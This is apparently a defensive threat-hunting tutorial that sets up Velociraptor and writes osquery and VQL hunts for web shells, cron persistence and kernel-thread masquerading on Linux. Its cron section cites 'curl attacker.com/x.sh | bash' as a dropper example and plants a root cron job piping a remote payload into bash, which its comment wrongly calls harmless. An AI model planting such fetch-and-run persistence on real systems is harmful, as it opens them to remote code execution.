# Part 3: Hunting for Execution & Persistence (Endpoint Hunt) — Expanded Edition

> **Blockquote — Why This Part Exists:** Part 2 built the sensors. Part 3 is where you finally *hunt* — using the auditd and osquery telemetry we wired up, plus a new tool, **Velociraptor**, to actively chase two of the most common real-world adversary behaviors on Linux: a **web shell** (an attacker's foothold disguised as legitimate web server activity) and **cron-based persistence** (an attacker's insurance policy to survive a reboot or credential rotation). Everything here plugs directly into the `execution`, `cron_persistence`, and `ssh_keys_*` audit keys we defined in Part 2 — if those aren't live, stop and go back before continuing.

---

## 3.1 Target Behaviors — What We're Actually Hunting

Before touching a single tool, let's define precisely what "execution and persistence" hunting means, using the same rigor Part 1 taught us.

| Behavior | MITRE ATT&CK ID | Plain-English Description | Why Attackers Do It |
|---|---|---|---|
| **Shell spawning anomalies** | T1059 (Command and Scripting Interpreter) | A process that should *never* spawn a shell (a web server, a database, a mail daemon) suddenly does | Almost always indicates a **web shell** or exploited service — legitimate `apache2`/`nginx`/`mysqld` processes have no business launching `/bin/bash` |
| **Cron job manipulation** | T1053.003 (Scheduled Task/Job: Cron) | A new or modified entry in `/etc/crontab`, `/etc/cron.d/`, or a user's personal crontab | Guarantees the attacker's code re-executes even after a reboot, a patch, or a password reset — cron persistence outlives almost everything except a full OS reinstall |
| **Binary masquerading** | T1036 (Masquerading) | A malicious binary named/placed to *look* like a legitimate system binary (e.g., `/tmp/.X11-unix/ps` instead of `/bin/ps`) | Evades casual visual inspection by administrators (`ps aux` output "looks normal") and sometimes evades naive allowlisting rules based on process name alone |

### 3.1.1 Why These Three Behaviors, Specifically, Belong Together

These three might look like an arbitrary grab-bag, but they form a coherent **attack narrative** — this is deliberate:

1. An attacker exploits a public-facing web application → drops a **web shell** (shell spawning anomaly).
2. Through that web shell, they run commands as the low-privilege web server user → they need **persistence** that survives the web app being patched or restarted, so they plant a **cron job**.
3. To avoid drawing attention during manual `ps`/`ls` inspection by an admin, they may rename their dropped tools to **masquerade** as legitimate binaries.

Hunting for all three together, and understanding how they chain, is far more powerful than hunting each in isolation — which is exactly why Velociraptor (below) lets us pull artifacts across *all three categories* in a single collection.

---

## 3.2 The Hunt Tool: Velociraptor

### 3.2.1 The Concept

**Velociraptor** is an open-source **DFIR** (Digital Forensics and Incident Response) orchestration platform. Where osquery answers "what is the state of *this one machine* right now," Velociraptor answers "run this specific forensic collection or hunt across some or all of my fleet, right now, and bring me back the results" — at scale, with a proper web UI, role-based access, and a purpose-built query language.

**Analogy:** If osquery is a single home inspector you can ask questions to in one house, Velociraptor is a **dispatch office that can send that same inspector's exact questionnaire to every house in the neighborhood simultaneously**, and collect all the answers into one filing cabinet for you to review together. It doesn't replace osquery or auditd — it *orchestrates* the collection and correlation of the very telemetry those tools already generate (and it also has its own extensive built-in artifact library beyond just querying those tools).

### 3.2.2 VQL — Velociraptor Query Language

Velociraptor's query language, **VQL**, resembles SQL but is purpose-built for forensic artifact collection: it can read files, parse binary structures, execute plugins (like scanning YARA signatures), and query the live OS — all within one unified query syntax. Think of VQL as "SQL that can also reach out and touch the actual filesystem and OS, not just a pre-populated table."

### 3.2.3 Installing Velociraptor

**The Target:** A running Velociraptor server (for this lab, in a simple standalone GUI mode) with the client agent deployed on our endpoint from Part 2.

```bash
# Create a dedicated, unprivileged working directory
sudo mkdir -p /opt/velociraptor
cd /opt/velociraptor

# Download the official signed Linux binary release directly from GitHub.
# ALWAYS verify you're pulling from the official velocidex/velociraptor
# repository - this is a security tool; supply-chain integrity matters
# more here than almost anywhere else in your stack.
sudo curl -L -o velociraptor \
  "https://github.com/Velocidex/velociraptor/releases/download/v0.72.4/velociraptor-v0.72.4-linux-amd64"

sudo chmod +x velociraptor

# Verify it runs and check version
./velociraptor version
```

**Verification (Install):**
Expected output:
```
Velociraptor v0.72.4
```

### 3.2.4 Generating a Server Configuration

**The Concept:** Velociraptor uses two distinct configuration files — a **server config** (defines how the GUI/API listens, and how clients authenticate to it) and a **client config** (tells an agent where to phone home to). Think of this like a walkie-talkie base station and handset: the base station config defines the frequency and password; the handset config tells the handset which base station to call.

```bash
# Interactive config generator - for this lab, choose:
#  - "Self Signed SSL" for the deployment type (fine for a lab; use a
#    real cert / reverse proxy for production)
#  - GUI listening on 127.0.0.1:8889 (default)
#  - Frontend (client-facing) listening on 0.0.0.0:8000
sudo ./velociraptor config generate -i
```

This produces two files in your working directory:

```
server.config.yaml   # The server's own configuration
client.config.yaml   # Distributed to every endpoint agent
```

**Step: Create the first admin user**

```bash
sudo ./velociraptor --config server.config.yaml user add admin --role administrator
```
You will be prompted to set a password interactively — set one now and record it securely; this is your GUI login.

**Step: Start the Velociraptor server**

#### File: `/etc/systemd/system/velociraptor-server.service`

```ini
[Unit]
Description=Velociraptor DFIR Server
After=network.target

[Service]
Type=simple
# --config points at the server config generated above. Running the
# frontend/server as its own systemd unit means it survives SSH
# disconnects and restarts automatically on crash (Restart=on-failure).
ExecStart=/opt/velociraptor/velociraptor --config /opt/velociraptor/server.config.yaml frontend -v
Restart=on-failure
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now velociraptor-server
```

**The Verification (Server):**

```bash
sudo systemctl status velociraptor-server
```
Expect `Active: active (running)`. Then, from a browser on the same machine (or via SSH tunnel if remote):

```bash
# If accessing remotely, tunnel the GUI port to your local machine first:
# ssh -L 8889:127.0.0.1:8889 user@lab-endpoint-01
```

Navigate to `https://127.0.0.1:8889`, accept the self-signed certificate warning (expected in a lab — a production deployment should use a properly signed cert), and log in with the `admin` credentials created above. **Seeing the Velociraptor dashboard load confirms the server is fully operational.**

### 3.2.5 Deploying the Client Agent

**The Target:** A Velociraptor client service running on the same lab endpoint where Part 2's auditd/osquery already live, so we can query it through Velociraptor's interface.

#### File: `/etc/systemd/system/velociraptor-client.service`

```ini
[Unit]
Description=Velociraptor DFIR Client
After=network.target

[Service]
Type=simple
# This client config was generated alongside the server config above -
# it embeds the server's address and a trust certificate so the client
# knows exactly who it's allowed to phone home to (preventing a rogue
# actor from impersonating your Velociraptor server).
ExecStart=/opt/velociraptor/velociraptor --config /opt/velociraptor/client.config.yaml client -v
Restart=on-failure
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now velociraptor-client
```

**The Verification (Client Enrollment):**

In the Velociraptor GUI, navigate to **"Search clients"** and search for your endpoint's hostname (e.g., `lab-endpoint-01`).

Expected result: your client appears in the list with a green "Online" indicator and a **Client ID** beginning with `C.`. If it doesn't appear within ~60 seconds, confirm outbound connectivity from the client to the server's frontend port (default `8000`):

```bash
sudo journalctl -u velociraptor-client -f --no-pager | tail -n 30
```

Look for a log line resembling `Connected to Velociraptor server` — if instead you see repeated connection errors, verify the `client.config.yaml` was copied correctly and the server's frontend port (8000) isn't blocked by a firewall (`sudo ufw allow 8000/tcp` if using UFW).

---

## 3.3 Hunt #1: Detecting Web Shells via VQL

### 3.3.1 The Concept

A **web shell** is a small script (often PHP, occasionally Perl/Python/JSP) uploaded to a compromised web server that gives an attacker a command-execution interface through ordinary HTTP requests. The single most reliable, tool-agnostic way to detect a web shell — regardless of what language it's written in or how it's obfuscated — is to look at **process ancestry**: legitimate web servers (`apache2`, `nginx`, `php-fpm`) almost never spawn shell interpreters (`/bin/sh`, `/bin/bash`, `/bin/dash`) as *child* processes during normal operation. A web shell's entire purpose is to make the web server do exactly that.

This is a textbook **top-of-the-pyramid** detection (recall §1.2): it doesn't matter what the web shell is named, what it's written in, or what IP the attacker connects from — the *parent-child process relationship* is a behavioral fact that's extremely difficult for an attacker to avoid while still achieving their goal.

### 3.3.2 The Target: A VQL Artifact for Web Shell Detection

**The Implementation:**

Run this directly in Velociraptor's **"Query"** view (accessible from the top navigation), targeting your enrolled client:

```sql
-- =============================================================================
-- VQL: Detect Web Server Processes Spawning Shell Interpreters
-- Hunts for: T1505.003 (Web Shell) via T1059 (Command Interpreter) ancestry
-- =============================================================================

-- SELECT pulls live process table data via Velociraptor's built-in
-- "pslist" plugin, which works cross-platform without needing osquery
-- installed at all - though we cross-correlate with osquery in 3.3.4 below.
SELECT
    Pid,
    Name,
    CommandLine,
    -- Parent process fields let us establish the ancestry chain that
    -- makes this detection reliable regardless of the child's own name
    Ppid,
    -- The GetParent() helper walks up the process tree by PID, returning
    -- the parent's own process record so we can inspect ITS name too
    GetParent(Pid=Ppid).Name AS ParentName,
    GetParent(Pid=Ppid).CommandLine AS ParentCommandLine,
    Username
FROM pslist()
WHERE
    -- Match any process that IS a shell interpreter...
    Name =~ "^(sh|bash|dash|ash)$"
    -- ...whose PARENT is one of the common web server process names.
    -- This regex covers Apache (httpd/apache2), Nginx, and common PHP
    -- FastCGI process managers - expand this list to match YOUR
    -- environment's actual web stack.
    AND GetParent(Pid=Ppid).Name =~ "^(apache2|httpd|nginx|php-fpm[0-9.]*|php-fpm)$"
```

**Line-by-line breakdown of the tricky parts:**

- `Name =~ "^(sh|bash|dash|ash)$"` — the `=~` operator is VQL's regex match; anchoring with `^...$` ensures we match the *entire* process name, not a substring (avoiding accidental matches on something like `bashrc-helper`).
- `GetParent(Pid=Ppid).Name` — this is VQL's ability to **chain plugin calls as computed columns**. `GetParent()` is a helper that, given a PID, returns that process's full record — we call it on `Ppid` (our found shell's parent PID) and immediately project its `.Name` field, letting us filter on a *two-generation-deep* ancestry relationship in a single query, something significantly harder to express in plain SQL against a flat process table.

**The Verification — Simulate a Web Shell Locally**

To prove this query works, we'll simulate the exact process ancestry a real web shell produces (without needing an actual vulnerable web app):

```bash
# On the lab endpoint, simulate "apache2 spawning bash" - this is
# EXACTLY what a PHP web shell's system()/exec() call produces under
# the hood, minus the actual HTTP-triggered vulnerability.
sudo -u www-data bash -c 'echo "simulated webshell parent" & sleep 30' &
```

> **Blockquote — Conceptual Warning:** This simulation spawns a `bash` process owned by `www-data` (the typical web server user) — but its direct parent will be your shell, not an actual `apache2` process, since we didn't exploit a real vulnerability. For a fully faithful test, you'd need `apache2` actually installed and configured to execute a CGI/PHP script that shells out. The simplified version above is sufficient to prove the **query mechanics** work; treat a full end-to-end simulation with a real vulnerable PHP endpoint as a valuable follow-up exercise once comfortable with this Part.

Re-run the VQL query in the Velociraptor GUI. If you adjust the `WHERE` clause temporarily to `GetParent(Pid=Ppid).Name =~ "bash"` (matching your actual simulated parent), you should see your simulated process returned with populated `ParentName`/`ParentCommandLine` fields — confirming the ancestry-walking logic itself is functioning correctly before you point it at a real web server.

### 3.3.3 Making It a Scheduled Velociraptor Hunt

**The Target:** Convert the ad-hoc query above into a saved, reusable **Velociraptor Hunt** — a definition that can be dispatched against one client, a group of clients, or your entire fleet on a recurring basis.

In the Velociraptor GUI: **View Artifacts → New Artifact**, and save the following as a custom artifact:

#### File (Velociraptor Artifact Definition): `Custom.Linux.Hunt.WebShellAncestry`

```yaml
name: Custom.Linux.Hunt.WebShellAncestry
description: |
  Detects shell interpreter processes (sh/bash/dash/ash) whose direct
  parent process is a common web server or PHP-FPM worker - a strong,
  behavior-based indicator of an active web shell (MITRE T1505.003).
type: CLIENT

parameters:
  - name: WebServerProcessRegex
    default: "^(apache2|httpd|nginx|php-fpm[0-9.]*|php-fpm)$"
    description: Regex matching your environment's web server process names.
  - name: ShellProcessRegex
    default: "^(sh|bash|dash|ash)$"
    description: Regex matching shell interpreter process names to flag.

sources:
  - query: |
      SELECT
          Pid, Name, CommandLine, Ppid,
          GetParent(Pid=Ppid).Name AS ParentName,
          GetParent(Pid=Ppid).CommandLine AS ParentCommandLine,
          Username
      FROM pslist()
      WHERE Name =~ ShellProcessRegex
        AND GetParent(Pid=Ppid).Name =~ WebServerProcessRegex
```

**The Verification:** Save the artifact, then from **"New Collection"** on your client, search for `Custom.Linux.Hunt.WebShellAncestry`, select it, and launch the collection. Confirm the collection completes with status `FINISHED` and inspect the **Results** tab — this is now a reusable, parameterized artifact any analyst on your team can run without writing raw VQL by hand each time.

### 3.3.4 Cross-Correlating with Osquery for Defense in Depth

**The Concept:** Never rely on a single tool's view. Here is the equivalent hunt expressed directly as an osquery SQL query (run via `osqueryi` or scheduled in our Part 2 query pack), useful when Velociraptor isn't available or as an independent confirmation source:

```sql
-- Osquery equivalent web shell ancestry hunt.
-- Self-joins the `processes` table against itself: once as the
-- potential shell child, once as its parent (p2), matched on p.parent = p2.pid.
SELECT
    p.pid            AS shell_pid,
    p.name           AS shell_name,
    p.cmdline        AS shell_cmdline,
    p2.pid           AS parent_pid,
    p2.name          AS parent_name,
    p2.cmdline       AS parent_cmdline,
    p.uid            AS shell_uid
FROM processes p
JOIN processes p2 ON p.parent = p2.pid
WHERE p.name IN ('sh', 'bash', 'dash', 'ash')
  AND p2.name IN ('apache2', 'httpd', 'nginx', 'php-fpm', 'php-fpm7.4', 'php-fpm8.1');
```

**The Verification:** With your simulated `www-data`-owned bash process from §3.3.2 still running (it sleeps for 30 seconds), quickly run:

```bash
osqueryi "SELECT p.pid AS shell_pid, p.name AS shell_name, p.uid AS shell_uid, p2.name AS parent_name FROM processes p JOIN processes p2 ON p.parent = p2.pid WHERE p.name IN ('sh','bash','dash','ash');"
```

Confirm at least one row is returned for any bash-family process, validating the join logic — then repeat with the actual `apache2`/`nginx` filter once you have a genuine web server test case.

---

## 3.4 Hunt #2: Detecting Cron-Based Persistence

### 3.4.1 The Concept

Recall from Part 2 that our `hunt.rules` file already has auditd watching `/etc/crontab`, `/etc/cron.d/`, and `/var/spool/cron/` for any write (`-w ... -p wa -k cron_persistence`), and our osquery `hunt-pack.json` already snapshots the full `crontab` table every 5 minutes. Part 3's job is to **actually query that telemetry** and know what "suspicious" looks like versus "normal."

**Analogy:** Part 2 installed a doorbell camera on the tool shed (auditd watch) and a nightly checklist of what's inside it (osquery snapshot). Part 3 is the moment you actually sit down, watch the footage, and compare tonight's checklist to last week's — noticing a tool that wasn't there before.

### 3.4.2 The Target: Querying Auditd for Cron Tampering Events

**The Implementation:**

```bash
# Search the audit log for anything tagged with our "cron_persistence" key
sudo ausearch -k cron_persistence -ts today
```

Expected output format (raw), which we then need to translate into something readable:
```
type=PATH msg=audit(1706301045.221:512): item=1 name="/etc/cron.d/malicious-job" ...
type=SYSCALL msg=audit(1706301045.221:512): arch=c000003e syscall=257 success=yes ... auid=1000 uid=0 comm="vim" exe="/usr/bin/vim" key="cron_persistence"
```

Note the power of the `auid` field here (recall §2.3): even though `uid=0` (the file was ultimately written as root, likely via `sudo`), `auid=1000` tells us **which original login session** actually performed the edit — critical attribution if `uid 1000` turns out to be a low-privilege account that should never need to touch system cron.

**A more readable interpretation using `aureport`:**

```bash
# aureport summarizes raw audit events into human-readable tabular
# reports - much friendlier for a first-pass triage than raw ausearch output
sudo aureport -k --summary | grep cron_persistence
```

### 3.4.3 The Target: Querying Osquery for Suspicious Cron Entries

**The Concept:** Not every cron write is malicious — most are legitimate admin activity or package installations. We need a query that filters osquery's `crontab` table for *specific suspicious characteristics* commonly seen in real attacker-planted cron jobs: commands referencing `/tmp`, `/dev/shm`, or `/var/tmp` (world-writable, non-standard execution paths), commands piping to a shell (`| sh`, `| bash`), or commands invoking encoding/decoding utilities (`base64 -d`) — a common obfuscation technique to hide a payload inside an otherwise innocuous-looking cron line.

```sql
-- =============================================================================
-- Osquery: Suspicious Cron Entry Hunt
-- Hunts for: T1053.003 (Scheduled Task/Job: Cron)
-- =============================================================================
SELECT
    path,
    command,
    minute, hour, day_of_month, month, day_of_week
FROM crontab
WHERE
    -- Execution from world-writable / non-standard temp directories -
    -- legitimate cron jobs almost universally call scripts from
    -- /usr/local/bin, /opt, or similarly permissioned, admin-controlled paths
    command LIKE '%/tmp/%'
    OR command LIKE '%/dev/shm/%'
    OR command LIKE '%/var/tmp/%'
    -- Piping straight into a shell interpreter - a classic dropper pattern
    -- ("curl attacker.com/x.sh | bash" is the single most common
    -- one-line cron persistence payload seen in the wild)
    OR command LIKE '%| sh%'
    OR command LIKE '%| bash%'
    OR command LIKE '%curl%|%'
    OR command LIKE '%wget%|%'
    -- Base64-encoded payloads - obfuscation to defeat casual visual
    -- inspection of `crontab -l` output by an administrator
    OR command LIKE '%base64 -d%'
    OR command LIKE '%base64 --decode%';
```

**The Verification — Simulate a Malicious Cron Entry**

```bash
# Plant a deliberately suspicious (but harmless - it just touches a
# file) cron entry matching our detection patterns, to prove the
# query catches it.
echo '* * * * * root curl http://example.com/payload.sh | bash' | sudo tee /etc/cron.d/system-update-check
```

Immediately re-run the osquery hunt:

```bash
osqueryi "SELECT path, command FROM crontab WHERE command LIKE '%| bash%';"
```

Expected output:
```
+---------------------------------+------------------------------------------------+
| path                            | command                                          |
+---------------------------------+------------------------------------------------+
| /etc/cron.d/system-update-check | curl http://example.com/payload.sh | bash        |
+---------------------------------+------------------------------------------------+
```

**Clean up your simulated finding immediately after verifying:**
```bash
sudo rm /etc/cron.d/system-update-check
```

Also confirm the *auditd* side caught the file write that created this entry:
```bash
sudo ausearch -k cron_persistence -ts recent | grep system-update-check
```
You should see a `PATH` record referencing `/etc/cron.d/system-update-check`, confirming **both** telemetry sources — the SQL-state view (osquery) and the kernel-event view (auditd) — independently captured the same malicious action, exactly the "defense in depth across pillars" principle from §2.1.

### 3.4.4 The Same Hunt as a VQL Velociraptor Artifact

For consistency and fleet-wide scale, here's the cron hunt as a Velociraptor artifact, usable against many endpoints at once from the same GUI as our web shell hunt:

#### File (Velociraptor Artifact Definition): `Custom.Linux.Hunt.SuspiciousCron`

```yaml
name: Custom.Linux.Hunt.SuspiciousCron
description: |
  Scans crontab entries across cron.d, crontab, and per-user spool files
  for suspicious characteristics: execution from world-writable temp
  paths, shell-piping download patterns, and base64 obfuscation.
  Maps to MITRE ATT&CK T1053.003.
type: CLIENT

sources:
  - query: |
      -- Velociraptor's built-in Linux.Sys.Crontab artifact plugin reads
      -- every crontab source on disk directly from the filesystem,
      -- rather than relying on a separately-installed osquery binary -
      -- useful on endpoints where osquery isn't deployed.
      SELECT * FROM Artifact.Linux.Sys.Crontab()
      WHERE CommandLine =~ "(/tmp/|/dev/shm/|/var/tmp/|\\| ?sh|\\| ?bash|base64 (-d|--decode))"
```

**The Verification:** Re-plant the same simulated cron entry from §3.4.3, launch this artifact as a new collection against your client in the GUI, and confirm the malicious line appears in the **Results** tab. Remove the simulated file afterward as shown above.

---

## 3.5 Hunt #3: Binary Masquerading Detection

### 3.5.1 The Concept

**Binary masquerading** (T1036) is when an attacker names or places a malicious file to resemble a legitimate system utility — e.g., dropping a backdoor at `/usr/bin/.ps` (a leading dot hides it from a plain `ls`) or naming a reverse shell binary `kworker` to blend in with legitimate Linux kernel worker threads (`kworker/0:1`, etc. are real, expected kernel processes). Detecting this requires comparing a process's **displayed name** against its **actual file path and origin**, since these should always agree for genuine system binaries.

### 3.5.2 The Target: An Osquery Masquerading Detection Query

```sql
-- =============================================================================
-- Osquery: Kernel Thread Masquerading Detection
-- Hunts for: T1036.004 (Masquerading: Masquerade Task or Service)
-- =============================================================================
-- Genuine Linux kernel worker threads (kworker, kswapd, ksoftirqd, migration,
-- rcu_*, etc.) NEVER have a resolvable on-disk path - they exist purely
-- in kernel space. Any process whose NAME impersonates a kernel thread
-- naming convention but DOES have a resolvable path is almost certainly
-- a masquerading user-space binary.
SELECT
    pid, name, path, cmdline, parent, uid
FROM processes
WHERE
    name LIKE 'kworker%'
    OR name LIKE 'ksoftirqd%'
    OR name LIKE 'kswapd%'
    OR name LIKE 'migration%'
    OR name LIKE 'rcu_%'
AND
    -- The critical differentiator: real kernel threads have an EMPTY path.
    -- A non-empty path on a "kernel-thread-named" process is the anomaly.
    path != '';
```

**The Verification:**

```bash
# Simulate a masquerading binary: copy a harmless real binary (sleep)
# to a kernel-thread-style name and path, then run it briefly.
cp /bin/sleep /tmp/kworker
chmod +x /tmp/kworker
/tmp/kworker 60 &
```

```bash
osqueryi "SELECT pid, name, path, cmdline FROM processes WHERE name = 'kworker' AND path != '';"
```

Expected output:
```
+------+---------+--------------+-------------------+
| pid  | name    | path         | cmdline            |
+------+---------+--------------+-------------------+
| 5521 | kworker | /tmp/kworker | /tmp/kworker 60    |
+------+---------+--------------+-------------------+
```

The presence of a non-empty `path` alongside a kernel-thread-style `name` confirms the detection logic works correctly. Clean up:
```bash
kill %1 2>/dev/null; rm -f /tmp/kworker
```

---

## 3.6 Completing the Hunt Investigation Template

Returning to our `HUNT-2024-001` document from Part 1 isn't appropriate here (that hunt is specifically about SSH lateral movement, executed in Part 4) — but this Part's three hunts each deserve their own filed report. Below is a completed example for the web shell hunt, demonstrating how Sections 6–11 (left blank in Part 1) get filled in once real queries are executed:

```markdown
# Hunt Investigation Report

## 1. Metadata
- **Hunt ID:** HUNT-2024-002
- **Analyst(s):** (your name here)
- **Date Started:** 2024-01-26
- **Date Concluded:** 2024-01-26
- **Status:** Concluded - Confirmed (simulated validation)

## 2. Hypothesis (ABLE Format)
- **Actor:** Generic post-exploitation actor with web application access
- **Behavior:** Web shell execution via anomalous process ancestry (T1505.003 / T1059)
- **Location:** Velociraptor pslist(), osquery processes table, auditd 'execution' key
- **Evidence:** Shell interpreter process (bash/sh/dash) with a web server process
  (apache2/nginx/php-fpm) as direct parent

## 3. MITRE ATT&CK Mapping
| Tactic ID | Tactic Name | Technique ID | Technique Name |
|---|---|---|---|
| TA0002 | Execution | T1059 | Command and Scripting Interpreter |
| TA0003 | Persistence | T1505.003 | Server Software Component: Web Shell |

## 4. Required Telemetry & Data Sources
| Source | Tool/Log Path | Time Range Queried | Available? (Y/N) |
|---|---|---|---|
| Live process ancestry | Velociraptor pslist() | Real-time | Y |
| Process table cross-check | osqueryi processes table | Real-time | Y |
| Historical execution events | auditd (key=execution) | Trailing 24h | Y |

## 5. Success / Failure Criteria
- **Confirms hypothesis if:** Any shell process found with a web-server-family parent process
- **Refutes hypothesis if:** Zero such ancestry relationships found across all checked hosts
- **Inconclusive if:** pslist() plugin fails to enumerate parent PIDs correctly

## 6. Queries Executed
### Query 1 (Velociraptor VQL)
Custom.Linux.Hunt.WebShellAncestry (see §3.3.3)
**Purpose:** Fleet-wide scan for shell-under-webserver ancestry
**Result Summary:** Simulated www-data->bash relationship confirmed detectable

### Query 2 (Osquery)
Self-join query from §3.3.4
**Purpose:** Independent cross-validation of ancestry detection logic
**Result Summary:** Matching row returned for simulated bash process

## 7. Findings
- **Summary:** Detection logic validated against simulated web shell process ancestry.
  No genuine web shell activity found in current lab environment (expected, as no
  vulnerable web app is deployed).
- **Affected hosts:** lab-endpoint-01 (simulation only)

## 8. Verdict
- [x] Benign True Positive — Activity confirmed but authorized/expected (simulation)

## 9. Response Actions Taken
- None required (lab simulation, cleaned up post-verification)

## 10. Detection Engineering Follow-Up
- **Should this become a permanent Sigma rule?** Yes
- **If yes, link to Sigma rule PR/file:** See Part 5, `sigma-rules/webshell-process-ancestry.yml`
- **Gaps identified:** Need real vulnerable web app test case for full end-to-end validation

## 11. Lessons Learned
- Ancestry-based detection is resilient to web shell renaming/obfuscation
- Consider expanding WebServerProcessRegex to cover additional stacks (tomcat, gunicorn, uwsgi)
```

> **Blockquote — Bridge to Part 5:** Notice Section 10 above already answers "yes" to becoming a Sigma rule, and even pre-names the file we'll create. This is the feedback loop from §1.1.3's Maturity Model in action — a manually-run hunt is about to become a permanent, automated detection.

---

## 3.7 Chapter Summary — What You Now Have

- [ ] **Velociraptor** server and client deployed, enrolled, and confirmed reachable via the GUI at `https://127.0.0.1:8889`.
- [ ] A validated, reusable VQL artifact — `Custom.Linux.Hunt.WebShellAncestry` — detecting web shells via parent-child process ancestry, independent of file names, languages, or hashes.
- [ ] A validated osquery cross-check query performing the same ancestry detection via a self-join, proving the behavioral logic holds across two independent tools.
- [ ] A validated osquery + auditd combined hunt for **suspicious cron persistence**, catching temp-path execution, shell-piped downloads, and base64 obfuscation — cross-confirmed against the kernel-level audit trail from Part 2.
- [ ] A validated osquery hunt for **kernel thread masquerading**, using the "real kernel threads never have an on-disk path" invariant.
- [ ] A completed `HUNT-2024-002` investigation report, explicitly flagged for promotion to a permanent Sigma rule in Part 5.

> **Blockquote — Bridge to Part 4:** Part 3 hunted the *endpoint* — what's running, and what's set to persist. But our original Part 1 hypothesis was never about a single machine; it was about an adversary **moving between** machines via SSH. No amount of single-host process or cron inspection can prove or disprove lateral movement — that evidence lives entirely on the network. Part 4 picks up exactly where Part 2's Zeek installation left off, executing the precise `conn.log`/`ssh.log` analysis our Part 1 hypothesis has been waiting on since Section 4 of the very first template we wrote.

**Proceed to Part 4: Hunting for Lateral Movement & C2 (Network Hunt).**
